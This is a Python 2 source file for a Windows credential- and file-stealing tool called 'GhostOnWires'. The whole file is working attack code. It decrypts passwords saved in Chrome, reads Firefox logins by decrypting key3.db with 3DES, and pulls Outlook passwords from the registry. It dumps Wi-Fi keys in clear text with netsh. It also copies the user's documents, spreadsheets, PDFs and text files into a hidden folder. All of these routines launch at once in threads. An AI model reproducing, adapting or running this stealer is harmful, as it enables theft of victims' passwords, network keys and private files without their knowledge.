##############################################################################
#                                                                            #
#                             By RootInSilence                               #
#                                                                            #
##############################################################################

from ctypes import *
from ConfigParser import RawConfigParser
from pyasn1.codec.der import decoder
from binascii import unhexlify
from Crypto.Util.number import long_to_bytes
from Crypto.Cipher import DES3
import os, time, glob, shutil, getpass, threading, subprocess
import sqlite3, logging, win32crypt, win32con, win32api
import struct, hashlib, base64, json, hmac


class Header():
    def Header(self):
        header_text = ''
        header_text += '|====================================================================|\r\n'
        header_text += '|                                                                    |\r\n'
        header_text += '|                     The GhostOnWires Project                       |\r\n'
        header_text += '|                                                                    |\r\n'
        header_text += '|                     Created By RootInSilence                       |\r\n'
        header_text += '|                                                                    |\r\n'
        header_text += '|====================================================================|\r\n'
        return header_text

    def title(self, title):
        return '\r\n------------------- ' + title + ' passwords -----------------\r\n'

    def title1(self, title1):
        print '[*] ' + title1 + '\n'

    def title_info(self, title):
        logging.info('------------------- ' + title + ' passwords -----------------\n')


class constant():
    folder_name = 'results'
    MAX_HELP_POSITION = 27
    CURRENT_VERSION = '1.0'
    output = None
    file_logger = None

    # mozilla options
    manually = None
    path = None
    bruteforce = None
    specific_path = None
    mozilla_software = ''

    # total password found
    nbPasswordFound = 0
    passwordFound = []


class Output():
    def __init__(self):
        self.user = getpass.getuser()
        self.wifi_dst = Create_Dir().wifi()

    def print_footer(self):
        footer = '\n[+] %s passwords have been found.\n' % str(constant.nbPasswordFound)
        print footer

    # print output if passwords have been found
    def print_output(self, software_name, pwdFound, title1=False):
        output = Header().Header()
        if pwdFound:
            # if the debug logging level is not apply => print the title
            if not logging.getLogger().isEnabledFor(logging.INFO):
                if not title1:
                    output += Header().title(software_name)

            toWrite = []
            password_category = False
            for pwd in pwdFound:
                # detect which kinds of password has been found
                lower_list = [s.lower() for s in pwd.keys()]
                password = [s for s in lower_list if "password" in s]
                if password:
                    password_category = password
                else:
                    key = [s for s in lower_list if "key" in s]  # for the wifi
                    if key:
                        password_category = key
                    else:
                        hash = [s for s in lower_list if "hash" in s]
                        if hash:
                            password_category = hash

                # No password found
                if not password_category:
                    output += "\r\nPassword not found !!!\r\n\r\n"
                else:
                    output += '\r\n%s found !!!\r\n\r\n' % password_category[0].title()
                    toWrite.append(pwd)

                    # Store all passwords found on a table => for dictionary attack if master password set
                    constant().nbPasswordFound += 1
                    try:
                        constant().passwordFound.append(pwd[password_category[0]])
                    except:
                        pass

                for p in pwd.keys():
                    try:
                        output += '%s: %s\r\n' % (p, pwd[p])
                    except Exception, e:
                        print('{0}'.format(e))
                        output += '%s: %s\r\n' % (p.encode('utf-8'), pwd[p].encode('utf-8'))
        else:
            logging.info("[!] No passwords found\n")

        with open(self.wifi_dst + "\\%s_%s.txt" % (self.user, software_name), "w+") as f:
            f.write(output)

    def print_debug(self, error_level, message):
        # print when password is found
        if error_level == 'OK':
            print message

        # print when password is not found
        elif error_level == 'FAILED':
            print message

        # print messages depending of their criticism
        elif error_level == 'CRITICAL':
            logging.critical('[CRITICAL] %s\n' % message)

        elif error_level == 'ERROR':
            logging.error('[ERROR] %s\n' % message)

        elif error_level == 'WARNING':
            logging.warning('[WARNING] %s\n' % message)

        elif error_level == 'DEBUG':
            logging.debug('[DEBUG] %s\n' % message)

        elif error_level == 'INFO':
            logging.info('%s\n' % message)

        else:
            logging.info('[%s] %s' % (error_level, message))


class Create_Dir():
    def __init__(self):
        self.cwd = os.getcwd()
        self.drive = self.cwd[:2]
        self.folder = "GhostOnWires"
        self.main_dst = self.cwd[:2] + "\\" + self.folder
        self.copy_dst = self.main_dst + "\\" + "Files"
        self.wifi_dst = self.main_dst + "\\" + "Passwords"

    def run(self):
        try:
            if not os.path.exists(self.main_dst):
                os.mkdir(self.main_dst)
                os.mkdir(self.copy_dst)
                os.mkdir(self.wifi_dst)
                windll.kernel32.SetFileAttributesW(ur'%s' % (self.main_dst), 0x02)
            else:
                pass
        except:
            pass

    def file(self):
        return self.copy_dst

    def wifi(self):
        return self.wifi_dst


Create_Dir().run()


class File():
    def __init__(self):
        self.user = getpass.getuser()
        self.copy_dst = Create_Dir().file()

    def copy_file(self, src_dir, ext):
        try:
            for path, dirs, files in os.walk(src_dir):
                files = glob.iglob(os.path.join(path, ext))
                for file in files:
                    file_path = os.path.join(path, file)
                    assert (os.path.exists(file_path))
                    shutil.copy2(file, self.copy_dst)
        except Exception, e:
            print(str(e))
            pass

    def get_files(self):
        src = ["C:\\Users\\%s\\Desktop" % (self.user), "C:\\Users\\%s\\Documents" % (self.user),
               "C:\\Users\\%s\\Downloads" % (self.user), "C:\\Users\\%s\\Pictures" % (self.user)]
        ext = ["*.docx", "*.xlsx", "*.txt", "*.pdf"]
        for x in range(len(src)):
            for y in range(len(ext)):
                threading.Thread(target=self.copy_file, args=("%s" % (src[x]), "%s" % (ext[y]))).start()

    def run(self):
        start_time = time.time()
        self.get_files()
        elapsed_time = time.time() - start_time
        print("File Thief: %s" % (elapsed_time))


class Chrome():
    # main function
    def run(self):

        database_path = ''
        if 'HOMEDRIVE' in os.environ and 'HOMEPATH' in os.environ:
            # For Win7
            path_Win7 = os.environ.get('HOMEDRIVE') + os.environ.get(
                'HOMEPATH') + '\Local Settings\Application Data\Google\Chrome\User Data\Default\Login Data'

            # For XP
            path_XP = os.environ.get('HOMEDRIVE') + os.environ.get(
                'HOMEPATH') + '\AppData\Local\Google\Chrome\User Data\Default\Login Data'

            if os.path.exists(path_XP):
                database_path = path_XP

            elif os.path.exists(path_Win7):
                database_path = path_Win7

            else:
                Output().print_debug('INFO', 'Google Chrome not installed.')
                return
        else:
            Output().print_debug('ERROR', 'Environment variables (HOMEDRIVE or HOMEPATH) have not been found')
            return

        # Copy database before to query it (bypass lock errors)
        try:
            shutil.copy(database_path, os.getcwd() + os.sep + 'tmp_db')
            database_path = os.getcwd() + os.sep + 'tmp_db'

        except Exception, e:
            Output().print_debug('DEBUG', '{0}'.format(e))
            Output().print_debug('ERROR', 'An error occured copying the database file')

        # Connect to the Database
        try:
            conn = sqlite3.connect(database_path)
            cursor = conn.cursor()
        except Exception, e:
            Output().print_debug('DEBUG', '{0}'.format(e))
            Output().print_debug('ERROR', 'An error occured opening the database file')
            return

            # Get the results
        try:
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        except:
            Output().print_debug('ERROR',
                                 'Google Chrome seems to be used, the database is locked. Kill the process and try again !')
            return

        pwdFound = []
        for result in cursor.fetchall():
            values = {}

            try:
                # Decrypt the Password
                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
            except Exception, e:
                password = ''
                Output().print_debug('DEBUG', '{0}'.format(e))

            if password:
                values['Site'] = result[0]
                values['Username'] = result[1]
                values['Password'] = password
                pwdFound.append(values)

        # print the results
        Output().print_output("Chrome", pwdFound)

        conn.close()
        if database_path.endswith('tmp_db'):
            os.remove(database_path)


# Database classes
database_find = False


class Credentials(object):
    def __init__(self, db):
        global database_find
        self.db = db
        if os.path.isfile(db):
            # check if the database is not empty
            f = open(db, 'r')
            tmp = f.read()
            if tmp:
                database_find = True
            f.close()

    def __iter__(self):
        pass

    def done(self):
        pass


class JsonDatabase(Credentials):
    def __init__(self, profile):
        db = profile + os.sep + "logins.json"
        super(JsonDatabase, self).__init__(db)

    def __iter__(self):
        if os.path.exists(self.db):
            with open(self.db) as fh:
                data = json.load(fh)
                try:
                    logins = data["logins"]
                except:
                    raise Exception("Unrecognized format in {0}".format(self.db))

                for i in logins:
                    yield (i["hostname"], i["encryptedUsername"], i["encryptedPassword"])


class SqliteDatabase(Credentials):
    def __init__(self, profile):
        db = profile + os.sep + "signons.sqlite"
        super(SqliteDatabase, self).__init__(db)
        self.conn = sqlite3.connect(db)
        self.c = self.conn.cursor()

    def __iter__(self):
        self.c.execute("SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins")
        for i in self.c:
            yield i

    def done(self):
        super(SqliteDatabase, self).done()
        self.c.close()
        self.conn.close()


class Mozilla():
    def __init__(self, isThunderbird=False):

        self.credentials_categorie = None

        self.toCheck = []
        self.manually_pass = None
        self.dictionary_path = None
        self.number_toStop = None

        self.key3 = ''

    software_name = 'Firefox'

    def get_path(self, software_name):
        path = '%s\Mozilla\Firefox' % str(os.environ['APPDATA'])

        return path

    def manage_advanced_options(self):
        # default attack
        if self.toCheck == []:
            self.toCheck = ['b', 'd']
            self.number_toStop = 3

    # --------------------------------------------

    def getShortLE(self, d, a):
        return struct.unpack('<H', (d)[a:a + 2])[0]

    def getLongBE(self, d, a):
        return struct.unpack('>L', (d)[a:a + 4])[0]

    def printASN1(self, d, l, rl):
        type = ord(d[0])
        length = ord(d[1])
        if length & 0x80 > 0:  # http://luca.ntop.org/Teaching/Appunti/asn1.html,
            nByteLength = length & 0x7f
            length = ord(d[2])
            # Long form. Two to 127 octets. Bit 8 of first octet has value "1" and bits 7-1 give the number of additional length octets.
            skip = 1
        else:
            skip = 0

        if type == 0x30:
            seqLen = length
            readLen = 0
            while seqLen > 0:
                len2 = self.printASN1(d[2 + skip + readLen:], seqLen, rl + 1)
                seqLen = seqLen - len2
                readLen = readLen + len2
            return length + 2
        elif type == 6:  # OID
            return length + 2
        elif type == 4:  # OCTETSTRING
            return length + 2
        elif type == 5:  # NULL
            # print 0
            return length + 2
        elif type == 2:  # INTEGER
            return length + 2
        else:
            if length == l - 2:
                self.printASN1(d[2:], length, rl + 1)
                return length

                # extract records from a BSD DB 1.85, hash mode

    def readBsddb(self, name):
        f = open(name, 'rb')

        # http://download.oracle.com/berkeley-db/db.1.85.tar.gz
        header = f.read(4 * 15)
        magic = self.getLongBE(header, 0)
        if magic != 0x61561:
            Output().print_debug('WARNING', 'Bad magic number')
            return False
        version = self.getLongBE(header, 4)
        if version != 2:
            Output().print_debug('WARNING', 'Bad version !=2 (1.85)')
            return False
        pagesize = self.getLongBE(header, 12)
        nkeys = self.getLongBE(header, 0x38)

        readkeys = 0
        page = 1
        nval = 0
        val = 1
        db1 = []
        while (readkeys < nkeys):
            f.seek(pagesize * page)
            offsets = f.read((nkeys + 1) * 4 + 2)
            offsetVals = []
            i = 0
            nval = 0
            val = 1
            keys = 0
            while nval != val:
                keys += 1
                key = self.getShortLE(offsets, 2 + i)
                val = self.getShortLE(offsets, 4 + i)
                nval = self.getShortLE(offsets, 8 + i)
                offsetVals.append(key + pagesize * page)
                offsetVals.append(val + pagesize * page)
                readkeys += 1
                i += 4
            offsetVals.append(pagesize * (page + 1))
            valKey = sorted(offsetVals)
            for i in range(keys * 2):
                f.seek(valKey[i])
                data = f.read(valKey[i + 1] - valKey[i])
                db1.append(data)
            page += 1
        f.close()
        db = {}

        for i in range(0, len(db1), 2):
            db[db1[i + 1]] = db1[i]

        return db

    def decrypt3DES(self, globalSalt, masterPassword, entrySalt, encryptedData):
        # see http://www.drh-consultancy.demon.co.uk/key3.html
        hp = hashlib.sha1(globalSalt + masterPassword).digest()
        pes = entrySalt + '\x00' * (20 - len(entrySalt))
        chp = hashlib.sha1(hp + entrySalt).digest()
        k1 = hmac.new(chp, pes + entrySalt, hashlib.sha1).digest()
        tk = hmac.new(chp, pes, hashlib.sha1).digest()
        k2 = hmac.new(chp, tk + entrySalt, hashlib.sha1).digest()
        k = k1 + k2
        iv = k[-8:]
        key = k[:24]

        return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)

    def extractSecretKey(self, globalSalt, masterPassword, entrySalt):

        (globalSalt, masterPassword, entrySalt) = self.is_masterpassword_correct(masterPassword)

        if unhexlify('f8000000000000000000000000000001') not in self.key3:
            return None
        privKeyEntry = self.key3[unhexlify('f8000000000000000000000000000001')]
        saltLen = ord(privKeyEntry[1])
        nameLen = ord(privKeyEntry[2])
        privKeyEntryASN1 = decoder.decode(privKeyEntry[3 + saltLen + nameLen:])
        data = privKeyEntry[3 + saltLen + nameLen:]
        self.printASN1(data, len(data), 0)

        # see https://github.com/philsmd/pswRecovery4Moz/blob/master/pswRecovery4Moz.txt
        entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
        privKeyData = privKeyEntryASN1[0][1].asOctets()
        privKey = self.decrypt3DES(globalSalt, masterPassword, entrySalt, privKeyData)
        self.printASN1(privKey, len(privKey), 0)

        privKeyASN1 = decoder.decode(privKey)
        prKey = privKeyASN1[0][2].asOctets()
        self.printASN1(prKey, len(prKey), 0)
        prKeyASN1 = decoder.decode(prKey)
        id = prKeyASN1[0][1]
        key = long_to_bytes(prKeyASN1[0][3])

        Output().print_debug('DEBUG', 'key: %s' % repr(key))
        return key

    # --------------------------------------------

    # Get the path list of the firefox profiles
    def get_firefox_profiles(self, directory):
        cp = RawConfigParser()
        cp.read(os.path.join(directory, 'profiles.ini'))
        profile_list = []
        for section in cp.sections():
            if section.startswith('Profile'):
                if cp.has_option(section, 'Path'):
                    profile_list.append(os.path.join(directory, cp.get(section, 'Path').strip()))
        return profile_list

    def save_db(self, userpath):

        # create the folder to save it by profile
        relative_path = constant().folder_name + os.sep + 'firefox'
        if not os.path.exists(relative_path):
            os.makedirs(relative_path)

        relative_path += os.sep + os.path.basename(userpath)
        if not os.path.exists(relative_path):
            os.makedirs(relative_path)

        # Get the database name
        if os.path.exists(userpath + os.sep + 'logins.json'):
            dbname = 'logins.json'
        elif os.path.exists(userpath + os.sep + 'signons.sqlite'):
            dbname = 'signons.sqlite'

        # copy the files (database + key3.db)
        try:
            ori_db = userpath + os.sep + dbname
            dst_db = relative_path + os.sep + dbname
            shutil.copyfile(ori_db, dst_db)
            Output().print_debug('INFO', '%s has been copied here: %s' % (dbname, dst_db))
        except Exception, e:
            Output().print_debug('DEBUG', '{0}'.format(e))
            Output().print_debug('ERROR', '%s has not been copied' % dbname)

        try:
            dbname = 'key3.db'
            ori_db = userpath + os.sep + dbname
            dst_db = relative_path + os.sep + dbname
            shutil.copyfile(ori_db, dst_db)
            Output().print_debug('INFO', '%s has been copied here: %s' % (dbname, dst_db))
        except Exception, e:
            Output().print_debug('DEBUG', '{0}'.format(e))
            Output().print_debug('ERROR', '%s has not been copied' % dbname)

    # ------------------------------ Master Password Functions ------------------------------

    def is_masterpassword_correct(self, masterPassword=''):
        try:
            # see http://www.drh-consultancy.demon.co.uk/key3.html
            pwdCheck = self.key3['password-check']
            entrySaltLen = ord(pwdCheck[1])
            entrySalt = pwdCheck[3: 3 + entrySaltLen]
            encryptedPasswd = pwdCheck[-16:]
            globalSalt = self.key3['global-salt']
            cleartextData = self.decrypt3DES(globalSalt, masterPassword, entrySalt, encryptedPasswd)
            if cleartextData != 'password-check\x02\x02':
                return ('', '', '')

            return (globalSalt, masterPassword, entrySalt)
        except:
            return ('', '', '')

    # ------------------------------ End of Master Password Functions ------------------------------

    # main function
    def run(self):
        global database_find
        database_find = False

        self.manage_advanced_options()

        software_name = constant().mozilla_software
        specific_path = constant().specific_path

        # print the title
        Header().title_info(software_name)

        # get the installation path
        path = self.get_path(software_name)
        if not path:
            Output().print_debug('WARNING', 'Installation path not found')
            return

        # Check if mozilla folder has been found
        elif not os.path.exists(path):
            Output().print_debug('INFO', software_name + ' not installed.')
            return
        else:
            if specific_path:
                if os.path.exists(specific_path):
                    profile_list = [specific_path]
                else:
                    Output().print_debug('WARNING', 'The following file does not exist: %s' % specific_path)
                    return
            else:
                profile_list = self.get_firefox_profiles(path)

            pwdFound = []
            for profile in profile_list:
                Output().print_debug('INFO', 'Profile path found: %s' % profile)
                if not os.path.exists(profile + os.sep + 'key3.db'):
                    Output().print_debug('WARNING', 'key3 file not found: %s' % self.key3)
                    return

                self.key3 = self.readBsddb(profile + os.sep + 'key3.db')
                if not self.key3:
                    return

                # check if passwords are stored on the Json format
                try:
                    credentials = JsonDatabase(profile)
                except:
                    database_find = False

                if not database_find:
                    # check if passwords are stored on the sqlite format
                    try:
                        credentials = SqliteDatabase(profile)
                    except:
                        database_find = False

                if database_find:
                    masterPassword = ''
                    (globalSalt, masterPassword, entrySalt) = self.is_masterpassword_correct(masterPassword)

                    # get user secret key
                    key = self.extractSecretKey(globalSalt, masterPassword, entrySalt)
                    if not key:
                        return

                    # everything is ready to decrypt password
                    for host, user, passw in credentials:
                        values = {}
                        values["Website"] = host

                        # Login
                        loginASN1 = decoder.decode(base64.b64decode(user))
                        iv = loginASN1[0][1][1].asOctets()
                        ciphertext = loginASN1[0][2].asOctets()
                        login = DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext)
                        # remove bad character at the end
                        try:
                            nb = struct.unpack('B', login[-1])[0]
                            values["Username"] = login[:-nb]
                        except:
                            values["Username"] = login

                        # Password
                        passwdASN1 = decoder.decode(base64.b64decode(passw))
                        iv = passwdASN1[0][1][1].asOctets()
                        ciphertext = passwdASN1[0][2].asOctets()
                        password = DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext)
                        # remove bad character at the end
                        try:
                            nb = struct.unpack('B', password[-1])[0]
                            values["Password"] = password[:-nb]
                        except:
                            values["Password"] = password

                        if len(values):
                            pwdFound.append(values)
            software_name = 'Firefox'
            # print the results
            Output().print_output(software_name, pwdFound)


class Outlook():
    def run(self):
        # print title
        Header().title_info('Outlook')

        accessRead = win32con.KEY_READ | win32con.KEY_ENUMERATE_SUB_KEYS | win32con.KEY_QUERY_VALUE
        keyPath = 'Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook'

        try:
            hkey = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, keyPath, 0, accessRead)
        except Exception, e:
            Output().print_debug('DEBUG', '{0}'.format(e))
            Output().print_debug('WARNING',
                                 'Outlook not installed.\nAn error occurs retrieving the registry key.\nKey = %s' % keyPath)
            return

        num = win32api.RegQueryInfoKey(hkey)[0]
        pwdFound = []
        for x in range(0, num):
            name = win32api.RegEnumKey(hkey, x)
            skey = win32api.RegOpenKey(hkey, name, 0, accessRead)

            num_skey = win32api.RegQueryInfoKey(skey)[0]
            if num_skey != 0:
                for y in range(0, num_skey):
                    name_skey = win32api.RegEnumKey(skey, y)
                    sskey = win32api.RegOpenKey(skey, name_skey, 0, accessRead)
                    num_sskey = win32api.RegQueryInfoKey(sskey)[1]
                    for z in range(0, num_sskey):
                        k = win32api.RegEnumValue(sskey, z)
                        if 'password' in k[0].lower():
                            values = self.retrieve_info(sskey, name_skey)
                            # write credentials into a text file
                            if len(values) != 0:
                                pwdFound.append(values)

        # print the results
        Output().print_output("Outlook", pwdFound)

    def retrieve_info(self, hkey, name_key):
        values = {}
        num = win32api.RegQueryInfoKey(hkey)[1]
        for x in range(0, num):
            k = win32api.RegEnumValue(hkey, x)
            if 'password' in k[0].lower():
                try:
                    password = win32crypt.CryptUnprotectData(k[1][1:], None, None, None, 0)[1]
                    values[k[0]] = password.decode('utf16')
                except Exception, e:
                    Output().print_debug('DEBUG', '{0}'.format(e))
                    values[k[0]] = 'N/A'
            else:
                try:
                    values[k[0]] = str(k[1]).decode('utf16')
                except:
                    values[k[0]] = str(k[1])
        return values


class Wifi():
    def __init__(self):
        self.user = getpass.getuser()

    def run(self):
        start_time = time.time()
        header = Header()
        wifi_dst = Create_Dir().wifi()
        cmd = subprocess.Popen("netsh wlan show profiles", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        output = cmd.stdout.read() + cmd.stderr.read()

        output_list = output.split("\r\n")
        keyword = '    All User Profile     : '
        wifi_users = []
        wifi_output = header.Header() + '\r\n'

        for x in range(len(output_list)):
            if keyword in output_list[x]:
                wifi_users.append(output_list[x][len(keyword):])
            else:
                pass

        for y in range(len(wifi_users)):
            keyword_list = ['    Name                   : ', '    Authentication         : ',
                            '    Cipher                 : ',
                            '    Security key           : ', '    Key Content            : ']
            main_cmd = subprocess.Popen("netsh wlan show profiles name=%s key=clear" % (wifi_users[y]), shell=True,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            win_output = ''
            win_output += main_cmd.stdout.read() + main_cmd.stderr.read()
            win_list = win_output.split('\r\n')
            for i in range(len(win_list)):
                for e in range(len(keyword_list)):
                    if keyword_list[e] in win_list[i]:
                        if keyword_list[0] in win_list[i]:
                            wifi_output += '\r\n-------------------- Wifi Information For %s --------------------\r\n\r\n' % (
                                win_list[i][len(keyword_list[0]):])
                        wifi_output += win_list[i][4:] + '\r\n'

        with open(wifi_dst + "\\%s_Wifi.txt" % (self.user), "w+") as f:
            f.write(wifi_output)
        elapsed_time = time.time() - start_time
        print("Wifi Thief: %s" % (elapsed_time))


def file_thief():
    File().run()


def wifi_thief():
    Wifi().run()


def chrome():
    Chrome().run()


def mozilla():
    Mozilla().run()

def outlook():
    Outlook().run()


def main():
    th1 = threading.Thread(target=chrome)
    th2 = threading.Thread(target=mozilla)
    th3 = threading.Thread(target=outlook)
    th4 = threading.Thread(target=wifi_thief)
    th5 = threading.Thread(target=file_thief)
    

    th1.start()
    th2.start()
    th3.start()
    th4.start()
    th5.start()


if __name__ == '__main__':
    main()
